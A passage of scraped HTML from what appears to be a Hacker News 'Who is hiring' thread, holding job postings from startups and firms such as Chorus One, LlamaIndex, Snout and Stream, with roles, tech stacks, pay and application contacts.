- Part-Time: Flexible hours (3-5 hours/week) to accommodate your schedule.
- UX Research Focus: Conduct in-depth user interviews, uncover user motivations, and leverage AI tools to record, summarize, and synthesize insights. We structure our user interviews to answer on one key question we have about the user's behavior (i.e When you invited your friend to install Eureka, how did you explain the app to them?). This is done in a 10-15 phone call.</p><p>What We're Looking For:</p><p>- Strong qualitative research experience, specifically user interviews.
- Comfort with AI-assisted research platforms and tools.
- Deep curiosity about user behaviors and motivations.
- Ability to clearly communicate findings and insights.</p><p>To Apply:</p><p>Please send a brief introduction and relevant experience or portfolio examples to kirby@eurekasurveys.com. We're excited to hear from you!</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244997"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244997" href="https://news.ycombinator.com/vote?id=43244997&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Chorus One | <a href="https://chorus.one/careers" rel="nofollow">https://chorus.one/careers</a> | Platforms Engineer | REMOTE (Switzerland ± 6 hours)</p><p>Chorus One operates validators on many proof-of-stake blockchains (the ones where security is based on a Byzantine fault-tolerant consensus algorithm rather than wasting energy). We are hiring for several roles, but the one I will highlight is what we call Platforms Engineer. Some companies call this Site Reliability Engineering or Devops.</p><p>The main thing we do is take upstream software, build it, run it on our infrastructure, and then monitor it and optimize that setup. Some things that make this interesting are:</p><pre><code>    * Building automation that enables us to do this for many networks (70+ currently).
    * Doing this with high uptime, building automation for failover, etc.
    * Working with software that is on the one hand cutting-edge and doing interesting things (consensus algorithms, distributed systems, cryptography), but on the other hand that means it’s immature and often not easy to operate and monitor. Often we have to build custom tools, and dive into the source code of the project. We contribute patches upstream when it makes sense.
    * Some of these projects are exercising the limits of what a machine can do, we have to do some low-level investigation that requires understanding of what the Linux kernel and network hardware are doing to properly identify what’s going on.
</code></pre><p>
We do have a small cloud footprint, but run primarily on bare metal. We are looking for people who can not just configure services offered by the public clouds, but who deeply understand what lies below; people who could build their own cloud. That sounds a bit pretentious and it’s not exactly what we do, but it does involve many of the same aspects.</p><p>A very recent example of what I personally find fascinating: last week Ethereum’s Holesky testnet experienced loss of liveness. This is a real-world, globally distributed system that implements Byzantine fault tolerance, with multiple independent implementations of the protocol. Several of these implementations had a bug in an update, which caused a split in the network. The protocol is designed to handle this situation in theory, but in practice it is triggering previously unexplored failure modes in the implementations, that are hard to test for in synthetic small-scale tests. I think there are very few places where you get to be involved in a planet-scale distributed system exhibiting “interesting” behavior, especially one that is not in control of a single entity. Of course, there is also the less fun part that the testnet is now broken, alerts are firing, and it’s hard and chaotic to coordinate a fix when the network is not controlled by a single entity. Fortunately it’s a testnet.</p><p>Apply at <a href="https://careers.chorus.one/o/platforms-engineer-remote" rel="nofollow">https://careers.chorus.one/o/platforms-engineer-remote</a>.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244266"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244266" href="https://news.ycombinator.com/vote?id=43244266&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Rally UXR | Remote | Full-time | Senior/Staff Software Engineer | $175k-$200k | 0.10% - 0.40% Equity
We're building the leading User Research CRM for Product teams (rallyuxr.com)</p><p>Apply here:</p><p><a href="https://www.ycombinator.com/companies/rally-uxr/jobs/3f6JRnn-senior-staff-software-engineer-product">https://www.ycombinator.com/companies/rally-uxr/jobs/3f6JRnn...</a></p><p>--------</p><p>At Rally, we believe <i>talking to your users</i> is the key to building great products and the single most important thing a product team can do.</p><p>To enable teams to talk to their users as fast as possible, we’ve built the most powerful User Research Platform that consolidates all the steps needed to talk to your users into a single tool.</p><p>By building Rally with a focus on scale, flexibility and quality, we’ve become the platform of choice for the biggest research teams in the world (StackOverflow, GitLab, MongoDB, Discord).</p><p>Since the start of Rally, we’ve been a fully remote company. While we have a strong remote first culture, we also value the importance of connecting with your teammates in person. We prioritize quarterly in-person offsites for the entire team with expenses fully paid for. Additionally, we offer a work-from-home stipend to ensure your remote setup is comfortable and well-equipped.</p><p>We’re a small team of seasoned Engineers and Designers who love to build. We place an emphasis on building with high craftsmanship, scalability, and a platform first mindset.</p><p>As a Senior/Staff Product Engineer, you’re expected to lead entire features end-to-end, collaborate closely with design to shape projects or initiatives, and deliver reliable and scalable systems. Rally is fully built with Typescript to make it easy for engineers to work quickly across the stack. While we don’t expect you to have a background in all the tools we use, we do expect strong JavaScript fundamentals and an ability to adopt new technology quickly.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243866"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243866" href="https://news.ycombinator.com/vote?id=43243866&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Dragonfly Connect | Full-time | Remote (Europe)</p><p>We’re an early stage start-up working at the intersection of system design, cloud infrastructure and AI to accelerate the adoption of modern tools and technologies. Our goal is nothing less than to enable businesses of all sizes and shapes to leverage best-of-class technologies and latest advancements in GenAI, including agentic frameworks.</p><p>We are currently in #StealthMode, but recently raised a hefty pre-seed fund from Tier 1 investors with additional contributions from some awesome angels to bring the vision to life. We are now in build mode and have already partnered up with 20+ world renowned brands to bring the product to the market.</p><p>Sounds exciting? This is a rare opportunity to join at the earliest stage and build the foundations of a generational product.</p><p>We're hiring for:</p><p>Lead Full Stack Engineer - <a href="https://apply.workable.com/dragonfly-connect/j/A3D751C816/" rel="nofollow">https://apply.workable.com/dragonfly-connect/j/A3D751C816/</a></p><p>Founding ML Engineer (Knowledge Graphs and Recommender Systems) - <a href="https://apply.workable.com/dragonfly-connect/j/3AF306CDF0/" rel="nofollow">https://apply.workable.com/dragonfly-connect/j/3AF306CDF0/</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243080"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243080" href="https://news.ycombinator.com/vote?id=43243080&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>LlamaIndex | Senior/Staff Software Engineer (LlamaParse) | San-Francisco, CA | Remote | Full-time | $100K – $300K + Equity | <a href="https://www.llamaindex.ai/careers" rel="nofollow">https://www.llamaindex.ai/careers</a></p><p>LlamaIndex is building a platform for AI agents that can find information, synthesize insights, generate reports, and take actions over the most complex enterprise data.</p><p>We are seeking an exceptional engineer to join our growing LlamaParse team.  Will work at the intersection of document processing, machine learning, and software engineering to push the boundaries of what's possible in document understanding. As a key member of a focused team, will have significant impact on our product's direction and technical architecture.</p><p>We are also hiring for a range of other roles, see our career page:</p><p>- Backend Software Engineer</p><p>- Forward Deploy Engineer</p><p>- Founding AI Engineer</p><p>- Open Source Engineer Python</p><p>- Founding Lead Product Manager</p><p>- Platform Engineer</p><p>- Senior Developer Relation Engineer</p><p>- Senior / Staff Backend Engineer</p><p>- Product Marketing Manager</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243812"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243812" href="https://news.ycombinator.com/vote?id=43243812&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Cora AI | Founding Engineers (Full Stack &amp; Applied AI) | SF, LA, NYC (Hybrid) | Full-time | $175-220k + Early Equity</p><p>We're building AI agents to transform how B2B companies scale customer relationships. Fresh off our seed round from Acrew Capital, Emerson Collective, Recall Capital and notable angels from LinkedIn, BetterUp, Glean, and Scale AI, and others we're looking for founding engineers to help realize our vision.</p><p>Tech stack: Python, FastAPI, React, Vite, modern AI/ML.</p><p>- Full Stack: <a href="https://cora-careers.notion.site/Founding-Full-Stack-Engineer-1a6ffd7e249581ec941fd519b235d0d3" rel="nofollow">https://cora-careers.notion.site/Founding-Full-Stack-Enginee...</a></p><p>- Applied AI: <a href="https://cora-careers.notion.site/Founding-Applied-AI-ML-Engineer-1a6ffd7e2495816e9cc3c55a417d7757" rel="nofollow">https://cora-careers.notion.site/Founding-Applied-AI-ML-Engi...</a></p><p>Looking for engineers who:</p><p>- Have 8+ years of production engineering experience</p><p>- Bring prior startup experience</p><p>- Are comfortable with modern AI/ML tech stack</p><p>- Have a track record of building production grade systems at scale</p><p>You can learn more here: <a href="https://cora-careers.notion.site/" rel="nofollow">https://cora-careers.notion.site/</a></p><p>If you are interested, email us at careers [at] cora.ai - These emails go to me and I review each one of them.</p><p>Feel free to reach out if you're interested or have any questions</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244439"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244439" href="https://news.ycombinator.com/vote?id=43244439&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>PMG | <a href="https://www.pmg.com/careers/" rel="nofollow">https://www.pmg.com/careers/</a> | Remote | Full Time | Developers, Data Scientists, Engineering Managers</p><p>We are looking to grow our technology team. We build large scale marketing technology to help make data more transparent to our clients, removing the blackbox nature of digital from a data perspective.
Looking for front-end, back-end and full stack developers of all skill levels.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243033"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243033" href="https://news.ycombinator.com/vote?id=43243033&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Snout <a href="https://www.snoutplans.com/" rel="nofollow">https://www.snoutplans.com/</a> | Principal Software Engineer | Remote US | Full Time</p><p>Join us at Snout on our mission to ensure no one ever has to make a health decision for their pet based on the cash in their bank account. Snout plans pay for 100% of routine veterinary care, unlimited visits, and additional member benefits - think pet insurance, that you will actually use every year.</p><p>Principal Software Engineer -
You will be working on our core wellness product, launched late-2022. Work includes the addition of new wellness plan features and capabilities, enhancement of user experience, testing and operation of the wellness platform, and special projects that arise from time to time. We frequently work cross-functionally and you can expect to write code and perform technical operations for our marketing, sales, and support efforts, as well.</p><p>Our tech stack includes Node.js, React, PostgreSQL, AWS, and Tailwind. We use both JavaScript and TypeScript heavily.</p><p>To apply please email jobs@snoutplans.com.</p><p>Our typical process is a 30 minute conversation with the hiring manager testing for cultural fit followed by a one hour technical interview.</p><p>We're a small startup team consisting of fewer than ten people. Successful team members are comfortable participating in spirited and detailed debates to establish product and technical plans, and then taking initiative and ownership to deliver on those plans quickly and effectively. Our team is collaborative. You can expect to meet with the team on a daily basis, pair regularly, and participate in slack discussions throughout the day. We keep pacific work hours and expect the team to be available during 9a-5p at a minimum. If you're looking for a team where you can carve out your area of responsibility, work with experienced partners who have your back, grow your role alongside the growth of the company, and take a product to the moon, then we should talk.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244207"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244207" href="https://news.ycombinator.com/vote?id=43244207&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>CredCore | Engineering | Full-time | Remote (Europe/India)</p><p>CredCore helps companies analyze Credit Agreements using AI. Learn more at <a href="https://www.credcore.com/" rel="nofollow">https://www.credcore.com</a>.</p><p>We’re looking for someone to lead key engineering efforts (8 years or more of experience mandatory). You should be good at modularizing and abstracting ideas, and be familiar with design patterns and software architecture. We're looking for (a) strong skills in TypeScript and Python, (b) experience working with Data Pipelines and tools such as Dagster, Metaflow etc, (c) ReactJS and/or other Front-end frameworks, (d) A good GitHub profile, blog, papers, or other portfolio.</p><p>This is a full-time, remote role. If you’re interested, please reach out to me at jeswin@credcore.com.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43244248"><td></td></tr>
                  <tr id="43243891"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243891" href="https://news.ycombinator.com/vote?id=43243891&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Bank of America Global Markets Data Science Apprenticeship | London | Full-time Apprenticeship | Onsite |</p><p>If you are UK based, graduating high school, but wish to pursue a career in finance, consider applying to our apprenticeship program (<a href="https://careers.bankofamerica.com/en-us/students/job-detail/12758/global-markets-data-science-apprenticeship-2025-london-london-united-kingdom" rel="nofollow">https://careers.bankofamerica.com/en-us/students/job-detail/...</a>)</p><p><i>The Team</i></p><p>Quantitative Strategies and Data Group (QSDG) uses models, data, and analytics to develop and deliver impactful solutions to sales and trading teams across Global Markets. We collaborate across business lines and are guided by the highest standards of governance, ethics and scientific rigor. In your role you will contribute directly to the firm by helping us serve our clients and manage risk.  You will be on active projects in the fast-paced environment of the trading floor.</p><p><i>Eligibility</i></p><p>- Hold or predicted to achieve at least 3 A levels/BTEC or equivalent with minimum grades of AAB (136 UCAS Points), with at least an A (or equivalent) in Mathematics</p><p>- Have at least a grade A or 8 in Mathematics and at least a grade 6 or B English Language GCSE or equivalent</p><p>- Have been a resident of the UK for the past 3 years</p><p>- Not in full-time education when starting the apprenticeship</p><p>- Have the right to work and remain in the UK indefinitely</p><p>- Have not completed a qualification or apprenticeship at the 
same level or higher which provided you with substantially the same skills or training as you would gain through this apprenticeship with Bank of America</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243706"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243706" href="https://news.ycombinator.com/vote?id=43243706&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Aqora | Quantum Computing Expert | Full-time | Paris (HQ) or Remote (Europe)
We're building the go-to hub for quantum computing, focused on organizing quantum hackathons and competitions globally as well as hosting quantum datasets and algorithms. We've partnered with major industry players, generating six-figure revenues, and have more exciting projects lined up.</p><p>Our MVP is live, and we're looking for a Quantum Computing Expert to help us scale. In this role, you’ll:</p><p>- Refine quantum use cases and define metrics to evaluate submissions. 
- Build partnerships and onboard quantum professionals. 
- Contribute to product-market fit and platform growth. 
- Assist with hackathons and write technical articles on challenges.</p><p>Requirements: - Experience in quantum algorithm development (digital &amp; analog). - Experience mentoring at hackathons. - Proactive and detail-oriented.</p><p>Bonus: PhD in quantum physics.</p><p>Perks: Competitive salary, equity options, workspace at Station F (Paris).</p><p>Apply by sending your resume, intro, and portfolio to <a href="https://quantum.jobs/jobs/85500519-quantum-computing-expert" rel="nofollow">https://quantum.jobs/jobs/85500519-quantum-computing-expert</a>. Help shape the future of quantum computing at Aqora!</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244497"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244497" href="https://news.ycombinator.com/vote?id=43244497&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>40GRID - Full-time Remote | React Native Mobile Engineer</p><p>Our mission is to empower field-service companies to grow by modernizing and automating their business operations. Every company we work with has unrealized potentials — our task is to build the platform that empowers growth and helps them unlock opportunities.</p><p>Email: jobs [at] 40grid.com (no recruiters or agencies, please put HN in subject line, thanks).</p><p>Tech: React Native</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243810"><td></td></tr>
            <tr id="43243844"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243844" href="https://news.ycombinator.com/vote?id=43243844&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>FunnelStory | Principal Backend Engineer (Go) | REMOTE (India) | Full-Time | 30-50 LPA | <a href="https://funnelstory.ai/" rel="nofollow">https://funnelstory.ai</a></p><p>I'm Preetam, co-founder and chief architect of FunnelStory. We're building a revenue data platform that helps Go-to-Market teams analyze customer behavior, predict churn, and optimize engagement using data, machine learning, and AI agents.</p><p>We're looking for a Principal Backend Engineer to build our core product from the ground up and set the foundation for our engineering team.</p><p>Tech Stack: Go, Docker, PostgreSQL/MySQL, AWS</p><p>Who we're looking for:</p><p>* 7+ years of backend engineering experience</p><p>* 4+ years working with Go, SQL (PostgreSQL/MySQL), and AWS</p><p>* Strong architectural and problem-solving skills</p><p>* Ability to communicate complex ideas simply</p><p>More details + apply: <a href="https://wellfound.com/jobs/3150036-principal-backend-engineer-golang" rel="nofollow">https://wellfound.com/jobs/3150036-principal-backend-enginee...</a></p><p>Interested? Email me at preetam @ funnelstory.ai with "HN" in the subject.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243632"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243632" href="https://news.ycombinator.com/vote?id=43243632&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Maven.com | Full stack product engineer | Full-time | Remote (USA, Canada)</p><p>Maven is the missing grad school for technology jobs. We have the largest collection of expert-led cohort-based-courses on the topics that matter most for today's careers.</p><p>We’re looking for full-stack product engineers to own big parts of our fast growing marketplace, from recommendation systems to data infrastructure to the course experience at the center of it.</p><p>The ideal candidate has shipped meaningful features to a real user base and is comfortable with the broad set of concerns that come with building production web apps.</p><p>You will have a high degree of ownership over our technical systems, and will be able to shape our product direction and the evolution of your own role.</p><p>We are a team of just under 20, have raised $25 million from a16z and First Round, and are growing towards profitability in the coming year and half.</p><p>We use React+Nextjs, Python+FastAPI, Postgres+OpenSearch, OpenAI, dbt+Snowflake.</p><p>Read more at <a href="https://maven.com/s/eng-jd" rel="nofollow">https://maven.com/s/eng-jd</a>
And email eng [at] our website with your resume and a note about yourself and your work.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243799"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243799" href="https://news.ycombinator.com/vote?id=43243799&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Vannevar Labs | REMOTE-FIRST | FULL-TIME | Offices in DC and NYC</p><p>Vannevar Labs builds next generation defense software for the public servants keeping our country safe. As a team, we exist because we believe in public service, and we think that our democracy and government improve only if we put serious, collective effort into improving them, including the technology our government uses. We build software to help the the US deter and deescalate conflict. We are a profitable growth startup with some of the best defense investors in the world, including General Catalyst, DFJ Growth, Point72, and enterprise tech investors Costanoa and Felicis.</p><p>We're looking for engineers across a number of departments, including our newly formed sensing team (embedded, perception engineers)! Apply on our website:</p><p><a href="https://boards.greenhouse.io/vannevarlabs" rel="nofollow">https://boards.greenhouse.io/vannevarlabs</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243587"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243587" href="https://news.ycombinator.com/vote?id=43243587&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Hightouch |Remote (North America)|Full-time | Backend, Fullstack, and Frontend Engineers</p><p>Some background on Hightouch - we’ve pioneered the Composable Customer Data Platform (CDP), which helps companies use their own data warehouse to collect, prepare, and activate customer data for marketing personalization and business operations. With Hightouch, every business user, without writing any code, can activate data to streamline critical processes, improve marketing performance, and scale operations.</p><p>We’ve just raised a Series C and scaled to $40m+ ARR in 3 years with 800+ customers including Fortune 500 co’s like Spotify, the NBA, PetSmart, etc.</p><p>We are hiring for:</p><p>Software Engineer, Distributed Systems
<a href="https://boards.greenhouse.io/hightouch/jobs/4782632004" rel="nofollow">https://boards.greenhouse.io/hightouch/jobs/4782632004</a></p><p>Machine Learning Engineers
<a href="https://boards.greenhouse.io/hightouch/jobs/5155115004" rel="nofollow">https://boards.greenhouse.io/hightouch/jobs/5155115004</a></p><p>Our Talent Team is committed to responding to everyone who applies!</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243286"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243286" href="https://news.ycombinator.com/vote?id=43243286&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Tetmon | QA Automation Engineer | Remote | Full-time <a href="https://www.tetmon.com/" rel="nofollow">https://www.tetmon.com/</a></p><p>Flexible hours, minimal meetings, fully remote</p><p>Tech: TypeScript, Python, Nix/NixOS</p><p>We have a suite of end-to-end tests that each spin up a virtual network from scratch to test our application. This test suite gates our automated release process and has been critical in allowing us to ship updates to users quickly and confidently. We'd like to expand it further and are looking for someone who cares about automation and correctness and can help us greatly expand what we test.</p><p>Part of the tests are written in Python (since that's what the NixOS test infrastructure provides) and part of the tests are written in TypeScript (the parts that drive a headless web browser). We developed our own convenience library on top of Puppeteer that make tests easier to write and more reliable than Puppeteer, Playwright, or Taiko (all of which we used previously). The tests can run locally (on Linux/MacOS development machines) and they run automatically on push to our build servers. The build servers are modern bare metal servers with Ampere and AMD CPUs with enough RAM to run dozens of test networks in parallel.</p><p>We have a simple review/interview/hiring process and low employee turnover.</p><p>Contact careers@tetmon.com and include your GitHub profile or attach examples of your work.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243534"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243534" href="https://news.ycombinator.com/vote?id=43243534&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Seen Finance | Multiple Roles | Full time | Berlin and Chicago | Hybrid on-site | <a href="https://seen.com/" rel="nofollow">https://seen.com</a>
At Seen, we believe that everyone deserves a fair opportunity to (re)build their credit. We understand how tough it can be to qualify for a credit card when your credit score isn't where you want it to be.</p><p>Seen is a new fintech company, started in 2023 following the acquisition of Sable (YC S19) by Snap Finance. We've recently launched a credit card in the US for people with less than ideal credit. We plan to offer other exciting credit products in the future.</p><p>It's a great time to join as the team is small (10 engineers) and we're growing fast. We're a startup but we're also lucky to have the financial support and customer base from our parent company.</p><p>We're hiring in Berlin for:</p><p>* VP of Analytics</p><p>* Senior Software Engineer</p><p>* Staff Software Engineer</p><p>We're hiring in Chicago for:</p><p>* Senior Data Engineer</p><p>* Staff Data Engineer.</p><p>Our software is written in Typescript. We use React and React Native. Our data stack uses dbt, Python and BigQuery.</p><p>If you're interested, just email us your resume or LinkedIn page: join-berlin@seen.com (for both Chicago and Berlin offices)</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243434"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243434" href="https://news.ycombinator.com/vote?id=43243434&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Konvu | <a href="https://konvu.com/" rel="nofollow">https://konvu.com/</a> | Software Engineer | FULLTIME | ONSITE | Paris, France</p><p>At Konvu, we’re on a mission to make security invisible. As we move towards a future dominated by code automatically generated, tested, and deployed by AIs, we need a new paradigm for application security. We need vulnerabilities to be automatically detected, prioritized and remediated.</p><p>Behind Konvu are founders with deep roots in the security industry. As part of the founding team at Sqreen (YC W18), a notable security startup acquired by Datadog, we have firsthand experience in driving security solutions from concept to global impact.</p><p>We’re looking for:</p><p>* Software Engineer to build out our Remediation Agent <a href="https://jobs.ashbyhq.com/konvu/554e5182-2989-44f2-91d1-8439fec69f2b" rel="nofollow">https://jobs.ashbyhq.com/konvu/554e5182-2989-44f2-91d1-8439f...</a></p><p>* Software Engineer to build out our Vulnerability Database <a href="https://jobs.ashbyhq.com/konvu/746a3f82-8542-4038-8ca6-b491201e8c45" rel="nofollow">https://jobs.ashbyhq.com/konvu/746a3f82-8542-4038-8ca6-b4912...</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243272"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243272" href="https://news.ycombinator.com/vote?id=43243272&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>SmarterDx | 150-250k+ + equity + benefits | Remote (US only) | Multiple roles | <a href="https://smarterdx.com/careers" rel="nofollow">https://smarterdx.com/careers</a></p><p>We are a rapid growth health tech company using AI to improve the hospital revenue cycle (finding missing diagnoses, net new revenue and helping clinicians focus on tasks that matter most). The current team is very high functioning (MD + data scientist combos, former ASF board member, Google and Amazon engineers, Stanford LLM researchers, etc.) and initially scaled the company to $1MM+ in contracted revenue without raising capital.</p><p>We have been backed by top investors including Floodgate (Lyft, Twitch, Twitter), Transformation Capital, and Bessemer for a total of $71mil, including our $50mil Series B announced in May 2024, and are experiencing an incredible growth trajectory customer and revenue wise with no signs of slowing down! This time last year, we were at 45 employees, and are above 160 as of today!</p><p>We are looking for: Data Scientists - ML Engineers - Engineering Managers - Staff and Senior SWEs, Full Stack and Backend focuses - More!</p><p>We have PMF, and it's time to scale! For more and to apply, see <a href="https://smarterdx.com/careers" rel="nofollow">https://smarterdx.com/careers</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243131"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243131" href="https://news.ycombinator.com/vote?id=43243131&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Counsel | <a href="https://counselhealth.com/" rel="nofollow">https://counselhealth.com</a> | Senior Software Engineer | Full-time | In-person in NYC</p><p>Counsel is re-inventing how healthcare is delivered by building an AI-first medical practice from the ground up. We believe in a future where patients can get unlimited, instant access to personalized medical advice from real clinicians in an asynchronous way.</p><p>We’re a small team but we’ve raised over $10M from a16z, Pear VC and other top investors. We’re live with several enterprise clients and are on track to serve hundreds of thousands of patients on our platform within the next year.</p><p>As one of our first engineers, you’ll have significant responsibility and ownership over our product and culture.
You’d enjoy working with us if:
- You want to join a mission-driven company looking to redefine the future of care delivery
- You’re excited to tackle frontier technical challenges in AI + Healthcare
- You thrive in a high-ownership, fast-paced environment</p><p>You can hear more about our vision here: <a href="https://a16z.com/podcast/an-ironman-suit-for-doctors-with-muthu-alagappan/" rel="nofollow">https://a16z.com/podcast/an-ironman-suit-for-doctors-with-mu...</a></p><p>Open Roles:
Senior Software Engineer: <a href="https://jobs.ashbyhq.com/counsel/12cf0cf3-73db-49d4-84a0-dd8b280e6337" rel="nofollow">https://jobs.ashbyhq.com/counsel/12cf0cf3-73db-49d4-84a0-dd8...</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243721"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243721" href="https://news.ycombinator.com/vote?id=43243721&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Firetiger | Software Engineers (full-stack, ML, systems) | Full-time | ONSITE San Francisco</p><p>Join Firetiger to build a next-generation observability platform that:</p><p>1) Gives businesses customer-level visibility - You should see when your most important customers are having issues, not just system-level metrics</p><p>2) Makes observability affordable and secure with a Bring Your Own Cloud architecture - own your data, and scale up without billing surprises</p><p>3) Stores your data in an open format (Apache Iceberg) so you can join observability data with other business datasets, unlocking insights that siloed observability vendors can't provide</p><p>Learn more: <a href="https://firetiger.com/" rel="nofollow">https://firetiger.com</a>, <a href="https://firetiger.notion.site/" rel="nofollow">https://firetiger.notion.site</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243228"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243228" href="https://news.ycombinator.com/vote?id=43243228&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Company: Stream <a href="https://getstream.io/" rel="nofollow">https://getstream.io/</a></p><p>We are hiring backend engineers ranging from Senior level to Staff / Lead / Director / Principal Go engineers.</p><p>If you have experience with a different tech stack, we offer a 10-week onboarding program to train you in Go, scaling and other key topics: <a href="https://tinyurl.com/2u5x9f9w" rel="nofollow">https://tinyurl.com/2u5x9f9w</a></p><p>At Stream, we use Go for our video SFU, chat API, Moderation and Feeds, serving high traffic from major apps like Strava, Nextdoor, Patreon, and Midjourney. 
Our tech stack: Go, CockroachDB, RocksDB, WebRTC, Raft, and Redis.</p><p>Why Join Stream?</p><p>* High scale/ difficult engineering</p><p>* Default alive. Startup growth opportunity with healthy revenue</p><p>* All managers are hands-on and capable engineers</p><p>* Edge network of servers around the world</p><p>* Great opportunity to learn and grow</p><p>Compensation: €70k–€160k depending on Seniority level and location</p><p>Remote: it’s a Netherlands-based role (hybrid), but exemptions for remote work within the EU may apply to specific cases</p><p>Visa Sponsorship: Available for the Netherlands</p><p>Apply here: <a href="https://jobs.ashbyhq.com/stream?utm_source=5rrpvObp3r" rel="nofollow">https://jobs.ashbyhq.com/stream?utm_source=5rrpvObp3r</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243226"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
